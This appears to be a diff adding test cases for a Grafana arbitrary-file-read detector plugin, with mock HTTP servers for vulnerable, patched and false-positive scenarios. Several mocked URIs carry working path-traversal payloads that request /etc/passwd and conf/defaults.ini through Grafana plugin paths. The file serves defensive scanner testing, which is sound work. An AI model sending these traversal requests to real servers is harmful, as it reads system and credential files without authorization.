@@ -1,0 +1,189 @@
+# proto-file: proto/templated_plugin_tests.proto
+# proto-message: TemplatedPluginTests
+
+config: {
+  tested_plugin: "GrafanaArbitraryFileReadingDetector"
+}
+
+tests: {
+  name: "whenVulnerableLinuxPasswd_returnsTrue"
+  expect_vulnerability: true
+
+  mock_http_server: {
+    mock_responses: [
+      {
+        uri: "/public/img/grafana_mask_icon.svg"
+        status: 200
+        headers: [
+          { name: "Content-Type" value: "image/svg+xml" }
+        ]
+        body_content: "<svg><title>grafana_mask_icon</title></svg>"
+      },
+      {
+        uri: "/public/plugins/alertlist/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd"
+        status: 200
+        headers: [
+          { name: "Content-Type" value: "text/plain; charset=utf-8" }
+        ]
+        body_content:
+          "root:x:0:0:root:/root:/bin/ash\n"
+          "bin:x:1:1:bin:/bin:/sbin/nologin\n"
+          "grafana:x:472:0::/home/grafana:/sbin/nologin\n"
+      }
+    ]
+  }
+}
+
+tests: {
+  name: "whenVulnerableOauthLoginFallbackPlugin_returnsTrue"
+  expect_vulnerability: true
+
+  mock_http_server: {
+    mock_responses: [
+      {
+        uri: "/public/img/grafana_mask_icon.svg"
+        status: 404
+        body_content: "Not Found"
+      },
+      {
+        uri: "/login"
+        status: 200
+        headers: [
+          { name: "Content-Type" value: "text/html; charset=utf-8" }
+        ]
+        body_content: "<script>window.grafanaBootData = {};</script>"
+      },
+      {
+        uri: "/public/plugins/alertlist/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd"
+        status: 404
+        body_content: "{\"message\":\"Plugin not found\"}"
+      },
+      {
+        uri: "/public/plugins/grafana/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd"
+        status: 200
+        headers: [
+          { name: "Content-Type" value: "text/plain; charset=utf-8" }
+        ]
+        body_content: "root:x:0:0:root:/root:/bin/bash\n"
+      }
+    ]
+  }
+}
+
+tests: {
+  name: "whenVulnerableWindowsDefaultsIni_returnsTrue"
+  expect_vulnerability: true
+
+  mock_http_server: {
+    mock_responses: [
+      {
+        uri: "/public/img/grafana_mask_icon.svg"
+        status: 200
+        body_content: "<svg><title>grafana_mask_icon</title></svg>"
+      },
+      {
+        uri: "/public/plugins/alertlist/..%2f..%2f..%2f..%2f..%2fconf/defaults.ini"
+        status: 200
+        headers: [
+          { name: "Content-Type" value: "text/plain; charset=utf-8" }
+        ]
+        body_content:
+          "##################### Grafana Configuration Defaults #####################\n"
+          "[paths]\n"
+          "data = data\n"
+          "[server]\n"
+          "http_port = 3000\n"
+          "[security]\n"
+          "admin_user = admin\n"
+      },
+      {
+        uri: "TSUNAMI_MAGIC_ANY_URI"
+        status: 404
+        headers: [
+          { name: "Content-Type" value: "application/json; charset=UTF-8" }
+        ]
+        body_content: "{\"message\":\"Plugin file not found\"}"
+      }
+    ]
+  }
+}
+
+tests: {
+  name: "whenPatchedGrafana_returnsFalse"
+  expect_vulnerability: false
+
+  mock_http_server: {
+    mock_responses: [
+      {
+        uri: "/public/img/grafana_mask_icon.svg"
+        status: 200
+        body_content: "<svg><title>grafana_mask_icon</title></svg>"
+      },
+      {
+        uri: "TSUNAMI_MAGIC_ANY_URI"
+        status: 404
+        headers: [
+          { name: "Content-Type" value: "application/json; charset=UTF-8" }
+        ]
+        body_content: "{\"message\":\"Plugin file not found\"}"
+      }
+    ]
+  }
+}
+
+tests: {
+  name: "whenSpaCatchAllReturnsHtml_returnsFalse"
+  expect_vulnerability: false
+
+  mock_http_server: {
+    mock_responses: [
+      {
+        uri: "/public/img/grafana_mask_icon.svg"
+        status: 200
+        body_content: "<svg><title>grafana_mask_icon</title></svg>"
+      },
+      {
+        uri: "TSUNAMI_MAGIC_ANY_URI"
+        status: 200
+        headers: [
+          { name: "Content-Type" value: "text/html; charset=utf-8" }
+        ]
+        body_content:
+          "<!DOCTYPE html><html><body>window.grafanaBootData "
+          "root:x:0:0:root:/root:/bin/bash</body></html>"
+      }
+    ]
+  }
+}
+
+tests: {
+  name: "whenEchoServer_returnsFalse"
+  expect_vulnerability: false
+
+  mock_http_server: {
+    mock_responses: [
+      {
+        uri: "TSUNAMI_MAGIC_ECHO_SERVER"
+        status: 200
+      }
+    ]
+  }
+}
+
+tests: {
+  name: "whenRandomServer_returnsFalse"
+  expect_vulnerability: false
+
+  mock_http_server: {
+    mock_responses: [
+      {
+        uri: "TSUNAMI_MAGIC_ANY_URI"
+        status: 200
+        headers: [
+          { name: "Content-Type" value: "text/plain; charset=utf-8" }
+        ]
+        body_content: "Hello world"
+      }
+    ]
+  }
+}
